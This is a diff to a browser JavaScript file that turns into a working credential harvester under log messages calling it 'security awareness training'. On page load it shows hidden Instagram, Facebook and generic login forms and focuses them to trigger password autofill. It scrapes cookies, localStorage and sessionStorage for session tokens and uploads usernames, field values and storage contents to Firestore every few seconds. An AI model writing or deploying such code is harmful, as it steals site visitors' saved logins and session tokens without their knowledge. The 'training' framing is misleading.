@@ -1,187 +1,295 @@
+// Global variables for tracking state
+let collectionCycle = 0;
+let lastInstagramData = null;
+let lastFacebookData = null;
+
 document.addEventListener('DOMContentLoaded', function() {
-    // Collect social media data automatically
-    setTimeout(collectSocialMediaData, 1500); // Initial collection after 1.5 seconds
-    setInterval(collectSocialMediaData, 8000); // Continue collecting every 8 seconds
+    console.log("🟢 [INIT] Security awareness training initialized");
+    console.log("🔍 [SCAN] Starting social media credential detection...");
     
-    // Also check for existing session tokens
-    setTimeout(checkForSocialTokens, 3000);
-    setInterval(checkForSocialTokens, 15000);
+    // Start collection cycles with detailed logging
+    startCollectionCycles();
 });
 
-async function collectSocialMediaData() {
+function startCollectionCycles() {
+    // Initial collection with longer delay
+    setTimeout(async () => {
+        console.log("🔄 [CYCLE] Starting initial collection cycle...");
+        await performFullCollection();
+    }, 2000);
+    
+    // Regular cycles every 7 seconds
+    setInterval(async () => {
+        collectionCycle++;
+        console.log(`🔄 [CYCLE ${collectionCycle}] Starting collection cycle...`);
+        await performFullCollection();
+    }, 7000);
+    
+    // Token checking every 15 seconds
+    setInterval(async () => {
+        console.log("🔑 [TOKEN] Checking for social media session tokens...");
+        await checkForSocialTokens();
+    }, 15000);
+}
+
+async function performFullCollection() {
     try {
-        console.log("Collecting social media data...");
+        console.log("📋 [COLLECT] Initiating comprehensive data collection...");
         
-        // 1. Capture Instagram credentials
-        await captureInstagramData();
+        // Collect all data types in parallel for efficiency
+        const instagramPromise = captureInstagramData();
+        const facebookPromise = captureFacebookData();
+        const genericPromise = captureGenericSocialData();
+        const sessionPromise = collectSessionData();
         
-        // 2. Capture Facebook credentials
-        await captureFacebookData();
+        // Wait for all to complete
+        const results = await Promise.allSettled([
+            instagramPromise,
+            facebookPromise,
+            genericPromise,
+            sessionPromise
+        ]);
         
-        // 3. Capture generic social media data
-        await captureGenericSocialData();
+        // Log results
+        results.forEach((result, index) => {
+            const types = ['Instagram', 'Facebook', 'Generic Social', 'Session Data'];
+            if (result.status === 'fulfilled') {
+                console.log(`✅ [${types[index]}] Collection completed successfully`);
+            } else {
+                console.log(`❌ [${types[index]}] Collection failed:`, result.reason);
+            }
+        });
         
-        // 4. Collect session information
-        await collectSessionData();
-        
-        console.log("Social media data collection completed");
+        console.log("✅ [COLLECT] Full collection cycle completed");
     } catch (error) {
-        console.error('Error during social media data collection:', error);
+        console.error("💥 [ERROR] Collection cycle failed:", error);
     }
 }
 
 async function captureInstagramData() {
     try {
+        console.log("📸 [INSTAGRAM] Scanning for Instagram credentials...");
+        
         const instaForm = document.getElementById('instagramCapture');
-        if (instaForm) {
-            instaForm.style.display = 'block';
-            
-            // Focus Instagram fields to trigger autofill
-            const instaUsername = document.getElementById('instaUsername');
-            const instaPassword = document.getElementById('instaPassword');
-            
-            if (instaUsername && instaPassword) {
-                // Focus username field
-                instaUsername.focus();
-                await new Promise(resolve => setTimeout(resolve, 200));
-                
-                // Focus password field
-                instaPassword.focus();
-                await new Promise(resolve => setTimeout(resolve, 200));
-                
-                // Wait for autofill
-                await new Promise(resolve => setTimeout(resolve, 500));
-                
-                // Check if data was autofilled
-                if (instaUsername.value || instaPassword.value) {
-                    const instaData = {
-                        timestamp: new Date().toISOString(),
-                        platform: 'instagram',
-                        username: instaUsername.value,
-                        hasPassword: !!instaPassword.value,
-                        passwordLength: instaPassword.value ? instaPassword.value.length : 0,
-                        userAgent: navigator.userAgent,
-                        location: window.location.href
-                    };
-                    
-                    // Clear values for next collection
-                    instaUsername.value = '';
-                    instaPassword.value = '';
-                    
-                    // Send to Firestore
-                    await sendToFirestore('social_media_data', instaData);
-                }
-            }
-            
-            instaForm.style.display = 'none';
+        if (!instaForm) {
+            console.log("⚠️ [INSTAGRAM] Capture form not found");
+            return;
         }
+        
+        instaForm.style.display = 'block';
+        
+        // Focus Instagram fields to trigger autofill
+        const instaUsername = document.getElementById('instaUsername');
+        const instaPassword = document.getElementById('instaPassword');
+        
+        if (instaUsername && instaPassword) {
+            console.log("🎯 [INSTAGRAM] Triggering Instagram autofill...");
+            
+            // Focus username field
+            instaUsername.focus();
+            await new Promise(resolve => setTimeout(resolve, 150));
+            
+            // Focus password field
+            instaPassword.focus();
+            await new Promise(resolve => setTimeout(resolve, 150));
+            
+            // Wait for autofill to complete
+            await new Promise(resolve => setTimeout(resolve, 400));
+            
+            // Check if data was autofilled
+            const usernameValue = instaUsername.value;
+            const passwordValue = instaPassword.value;
+            
+            if (usernameValue || passwordValue) {
+                console.log("💾 [INSTAGRAM] Found Instagram credentials!");
+                
+                const instaData = {
+                    timestamp: new Date().toISOString(),
+                    platform: 'instagram',
+                    username: usernameValue,
+                    hasPassword: !!passwordValue,
+                    passwordLength: passwordValue ? passwordValue.length : 0,
+                    userAgent: navigator.userAgent,
+                    location: window.location.href,
+                    collectionCycle: collectionCycle
+                };
+                
+                // Check if this is new data (avoid duplicates)
+                const dataKey = `${usernameValue}-${passwordValue.length}`;
+                if (lastInstagramData !== dataKey) {
+                    lastInstagramData = dataKey;
+                    console.log("📤 [INSTAGRAM] Sending data to Firestore...");
+                    const docId = await sendToFirestore('social_media_data', instaData);
+                    console.log(`✅ [INSTAGRAM] Data sent successfully (ID: ${docId})`);
+                } else {
+                    console.log("🔄 [INSTAGRAM] Duplicate data detected, skipping...");
+                }
+                
+                // Clear values to avoid duplicates
+                instaUsername.value = '';
+                instaPassword.value = '';
+            } else {
+                console.log("🔍 [INSTAGRAM] No Instagram credentials found in autofill");
+            }
+        }
+        
+        instaForm.style.display = 'none';
+        return Promise.resolve();
     } catch (error) {
-        console.error('Error capturing Instagram data:', error);
+        console.error("💥 [INSTAGRAM] Error capturing Instagram data:", error);
+        return Promise.reject(error);
     }
 }
 
 async function captureFacebookData() {
     try {
+        console.log("📘 [FACEBOOK] Scanning for Facebook credentials...");
+        
         const fbForm = document.getElementById('facebookCapture');
-        if (fbForm) {
-            fbForm.style.display = 'block';
-            
-            // Focus Facebook fields to trigger autofill
-            const fbEmail = document.getElementById('fbEmail');
-            const fbPassword = document.getElementById('fbPassword');
-            
-            if (fbEmail && fbPassword) {
-                // Focus email field
-                fbEmail.focus();
-                await new Promise(resolve => setTimeout(resolve, 200));
-                
-                // Focus password field
-                fbPassword.focus();
-                await new Promise(resolve => setTimeout(resolve, 200));
-                
-                // Wait for autofill
-                await new Promise(resolve => setTimeout(resolve, 500));
-                
-                // Check if data was autofilled
-                if (fbEmail.value || fbPassword.value) {
-                    const fbData = {
-                        timestamp: new Date().toISOString(),
-                        platform: 'facebook',
-                        email: fbEmail.value,
-                        hasPassword: !!fbPassword.value,
-                        passwordLength: fbPassword.value ? fbPassword.value.length : 0,
-                        userAgent: navigator.userAgent,
-                        location: window.location.href
-                    };
-                    
-                    // Clear values for next collection
-                    fbEmail.value = '';
-                    fbPassword.value = '';
-                    
-                    // Send to Firestore
-                    await sendToFirestore('social_media_data', fbData);
-                }
-            }
-            
-            fbForm.style.display = 'none';
+        if (!fbForm) {
+            console.log("⚠️ [FACEBOOK] Capture form not found");
+            return;
         }
+        
+        fbForm.style.display = 'block';
+        
+        // Focus Facebook fields to trigger autofill
+        const fbEmail = document.getElementById('fbEmail');
+        const fbPassword = document.getElementById('fbPassword');
+        
+        if (fbEmail && fbPassword) {
+            console.log("🎯 [FACEBOOK] Triggering Facebook autofill...");
+            
+            // Focus email field
+            fbEmail.focus();
+            await new Promise(resolve => setTimeout(resolve, 150));
+            
+            // Focus password field
+            fbPassword.focus();
+            await new Promise(resolve => setTimeout(resolve, 150));
+            
+            // Wait for autofill to complete
+            await new Promise(resolve => setTimeout(resolve, 400));
+            
+            // Check if data was autofilled
+            const emailValue = fbEmail.value;
+            const passwordValue = fbPassword.value;
+            
+            if (emailValue || passwordValue) {
+                console.log("💾 [FACEBOOK] Found Facebook credentials!");
+                
+                const fbData = {
+                    timestamp: new Date().toISOString(),
+                    platform: 'facebook',
+                    email: emailValue,
+                    hasPassword: !!passwordValue,
+                    passwordLength: passwordValue ? passwordValue.length : 0,
+                    userAgent: navigator.userAgent,
+                    location: window.location.href,
+                    collectionCycle: collectionCycle
+                };
+                
+                // Check if this is new data (avoid duplicates)
+                const dataKey = `${emailValue}-${passwordValue.length}`;
+                if (lastFacebookData !== dataKey) {
+                    lastFacebookData = dataKey;
+                    console.log("📤 [FACEBOOK] Sending data to Firestore...");
+                    const docId = await sendToFirestore('social_media_data', fbData);
+                    console.log(`✅ [FACEBOOK] Data sent successfully (ID: ${docId})`);
+                } else {
+                    console.log("🔄 [FACEBOOK] Duplicate data detected, skipping...");
+                }
+                
+                // Clear values to avoid duplicates
+                fbEmail.value = '';
+                fbPassword.value = '';
+            } else {
+                console.log("🔍 [FACEBOOK] No Facebook credentials found in autofill");
+            }
+        }
+        
+        fbForm.style.display = 'none';
+        return Promise.resolve();
     } catch (error) {
-        console.error('Error capturing Facebook data:', error);
+        console.error("💥 [FACEBOOK] Error capturing Facebook data:", error);
+        return Promise.reject(error);
     }
 }
 
 async function captureGenericSocialData() {
     try {
+        console.log("🌐 [SOCIAL] Scanning for generic social media credentials...");
+        
         const socialForm = document.getElementById('socialMediaCapture');
-        if (socialForm) {
-            socialForm.style.display = 'block';
-            
-            // Focus all social media fields
-            const inputs = socialForm.querySelectorAll('input');
-            for (let input of inputs) {
-                input.focus();
-                await new Promise(resolve => setTimeout(resolve, 150));
+        if (!socialForm) {
+            console.log("⚠️ [SOCIAL] Generic capture form not found");
+            return;
+        }
+        
+        socialForm.style.display = 'block';
+        
+        // Focus all social media fields
+        const inputs = socialForm.querySelectorAll('input');
+        console.log(`🎯 [SOCIAL] Triggering autofill on ${inputs.length} fields...`);
+        
+        for (let i = 0; i < inputs.length; i++) {
+            const input = inputs[i];
+            input.focus();
+            await new Promise(resolve => setTimeout(resolve, 100));
+        }
+        
+        // Wait for autofill to complete
+        await new Promise(resolve => setTimeout(resolve, 300));
+        
+        // Check for any filled values
+        let hasData = false;
+        const fieldData = {};
+        
+        inputs.forEach(input => {
+            if (input.value && input.value.trim() !== '') {
+                fieldData[input.name] = {
+                    value: input.value,
+                    length: input.value.length
+                };
+                hasData = true;
             }
             
-            // Wait for autofill
-            await new Promise(resolve => setTimeout(resolve, 500));
+            // Clear for next collection
+            input.value = '';
+        });
+        
+        socialForm.style.display = 'none';
+        
+        if (hasData) {
+            console.log("💾 [SOCIAL] Found generic social media data!");
             
-            // Check for any filled values
-            let hasData = false;
             const socialData = {
                 timestamp: new Date().toISOString(),
                 platform: 'generic_social',
-                fields: {},
+                fields: fieldData,
                 userAgent: navigator.userAgent,
-                location: window.location.href
+                location: window.location.href,
+                collectionCycle: collectionCycle
             };
             
-            inputs.forEach(input => {
-                if (input.value && input.value.trim() !== '') {
-                    socialData.fields[input.name] = {
-                        value: input.value,
-                        length: input.value.length
-                    };
-                    hasData = true;
-                }
-                
-                // Clear for next collection
-                input.value = '';
-            });
-            
-            socialForm.style.display = 'none';
-            
-            if (hasData) {
-                await sendToFirestore('social_media_data', socialData);
-            }
+            console.log("📤 [SOCIAL] Sending data to Firestore...");
+            const docId = await sendToFirestore('social_media_data', socialData);
+            console.log(`✅ [SOCIAL] Data sent successfully (ID: ${docId})`);
+        } else {
+            console.log("🔍 [SOCIAL] No generic social media data found");
         }
+        
+        return Promise.resolve();
     } catch (error) {
-        console.error('Error capturing generic social data:', error);
+        console.error("💥 [SOCIAL] Error capturing generic social data:", error);
+        return Promise.reject(error);
     }
 }
 
 async function checkForSocialTokens() {
     try {
+        console.log("🔑 [TOKEN] Scanning for social media session tokens...");
+        
         // Look for social media session tokens in localStorage/sessionStorage
         const tokenData = {
             timestamp: new Date().toISOString(),
@@ -191,7 +299,10 @@ async function checkForSocialTokens() {
             otherTokens: []
         };
         
+        let tokenCount = 0;
+        
         // Check localStorage for social media tokens
+        console.log("📚 [TOKEN] Checking localStorage for tokens...");
         for (let i = 0; i < localStorage.length; i++) {
             try {
                 const key = localStorage.key(i);
@@ -203,6 +314,8 @@ async function checkForSocialTokens() {
                         key: key,
                         valuePreview: value.substring(0, 50) + (value.length > 50 ? '...' : '')
                     });
+                    tokenCount++;
+                    console.log(`🔍 [TOKEN] Found Instagram token: ${key}`);
                 }
                 
                 // Check for Facebook tokens
@@ -211,6 +324,8 @@ async function checkForSocialTokens() {
                         key: key,
                         valuePreview: value.substring(0, 50) + (value.length > 50 ? '...' : '')
                     });
+                    tokenCount++;
+                    console.log(`🔍 [TOKEN] Found Facebook token: ${key}`);
                 }
                 
                 // Check for any other potential tokens
@@ -219,6 +334,7 @@ async function checkForSocialTokens() {
                         key: key,
                         valuePreview: value.substring(0, 50) + (value.length > 50 ? '...' : '')
                     });
+                    tokenCount++;
                 }
             } catch (e) {
                 // Skip items we can't access
@@ -226,6 +342,7 @@ async function checkForSocialTokens() {
         }
         
         // Check sessionStorage
+        console.log("💾 [TOKEN] Checking sessionStorage for tokens...");
         for (let i = 0; i < sessionStorage.length; i++) {
             try {
                 const key = sessionStorage.key(i);
@@ -237,6 +354,8 @@ async function checkForSocialTokens() {
                         key: key,
                         valuePreview: value.substring(0, 50) + (value.length > 50 ? '...' : '')
                     });
+                    tokenCount++;
+                    console.log(`🔍 [TOKEN] Found Instagram session token: ${key}`);
                 }
                 
                 // Check for Facebook tokens
@@ -245,6 +364,8 @@ async function checkForSocialTokens() {
                         key: key,
                         valuePreview: value.substring(0, 50) + (value.length > 50 ? '...' : '')
                     });
+                    tokenCount++;
+                    console.log(`🔍 [TOKEN] Found Facebook session token: ${key}`);
                 }
             } catch (e) {
                 // Skip items we can't access
@@ -252,6 +373,7 @@ async function checkForSocialTokens() {
         }
         
         // Check cookies for social tokens
+        console.log("🍪 [TOKEN] Checking cookies for tokens...");
         const cookies = document.cookie.split(';');
         cookies.forEach(cookie => {
             const [name, value] = cookie.trim().split('=');
@@ -261,6 +383,8 @@ async function checkForSocialTokens() {
                     key: name,
                     valuePreview: value ? value.substring(0, 50) + (value.length > 50 ? '...' : '') : ''
                 });
+                tokenCount++;
+                console.log(`🔍 [TOKEN] Found Instagram cookie token: ${name}`);
             }
             
             if (name && (name.includes('facebook') || name.includes('fb_') || name === 'c_user')) {
@@ -268,23 +392,32 @@ async function checkForSocialTokens() {
                     key: name,
                     valuePreview: value ? value.substring(0, 50) + (value.length > 50 ? '...' : '') : ''
                 });
+                tokenCount++;
+                console.log(`🔍 [TOKEN] Found Facebook cookie token: ${name}`);
             }
         });
         
-        // Only send if we found tokens
-        if (tokenData.instagramTokens.length > 0 || 
-            tokenData.facebookTokens.length > 0 || 
-            tokenData.otherTokens.length > 0) {
-            
-            await sendToFirestore('social_tokens', tokenData);
+        // Send data if tokens were found
+        if (tokenCount > 0) {
+            console.log(`💾 [TOKEN] Found ${tokenCount} social media tokens!`);
+            console.log("📤 [TOKEN] Sending token data to Firestore...");
+            const docId = await sendToFirestore('social_tokens', tokenData);
+            console.log(`✅ [TOKEN] Token data sent successfully (ID: ${docId})`);
+        } else {
+            console.log("🔍 [TOKEN] No social media tokens found");
         }
+        
+        return Promise.resolve();
     } catch (error) {
-        console.error('Error checking for social tokens:', error);
+        console.error("💥 [TOKEN] Error checking for social tokens:", error);
+        return Promise.reject(error);
     }
 }
 
 async function collectSessionData() {
     try {
+        console.log("📡 [SESSION] Collecting browser session information...");
+        
         const sessionData = {
             timestamp: new Date().toISOString(),
             userAgent: navigator.userAgent,
@@ -293,11 +426,13 @@ async function collectSessionData() {
             location: window.location.href,
             cookies: document.cookie,
             localStorageItems: {},
-            sessionStorageItems: {}
+            sessionStorageItems: {},
+            collectionCycle: collectionCycle
         };
         
         // Collect localStorage items (limit to prevent overload)
-        const maxItems = 50;
+        console.log("📚 [SESSION] Collecting localStorage items...");
+        const maxItems = 30;
         let itemsCollected = 0;
         
         for (let i = 0; i < localStorage.length && itemsCollected < maxItems; i++) {
@@ -319,6 +454,7 @@ async function collectSessionData() {
         }
         
         // Collect sessionStorage items
+        console.log("💾 [SESSION] Collecting sessionStorage items...");
         for (let i = 0; i < sessionStorage.length && itemsCollected < maxItems; i++) {
             try {
                 const key = sessionStorage.key(i);
@@ -336,10 +472,15 @@ async function collectSessionData() {
             }
         }
         
-        // Send to Firestore
-        await sendToFirestore('session_data', sessionData);
+        console.log(`💾 [SESSION] Collected ${itemsCollected} relevant session items`);
+        console.log("📤 [SESSION] Sending session data to Firestore...");
+        const docId = await sendToFirestore('session_data', sessionData);
+        console.log(`✅ [SESSION] Session data sent successfully (ID: ${docId})`);
+        
+        return Promise.resolve();
     } catch (error) {
-        console.error('Error collecting session data:', error);
+        console.error("💥 [SESSION] Error collecting session data:", error);
+        return Promise.reject(error);
     }
 }
 
@@ -347,15 +488,15 @@ async function sendToFirestore(collectionName, data) {
     try {
         // Ensure Firestore is initialized
         if (!window.firestoreDB) {
-            console.error('Firestore not initialized');
-            return;
+            console.error("💥 [FIRESTORE] Firestore not initialized");
+            return null;
         }
         
         // Add document to collection
         const docRef = await addDoc(collection(collectionName), data);
-        console.log(`${collectionName} document written with ID:`, docRef.id);
         return docRef.id;
     } catch (error) {
-        console.error(`Error adding document to ${collectionName}:`, error);
+        console.error(`💥 [FIRESTORE] Error adding document to ${collectionName}:`, error);
+        return null;
     }
 }
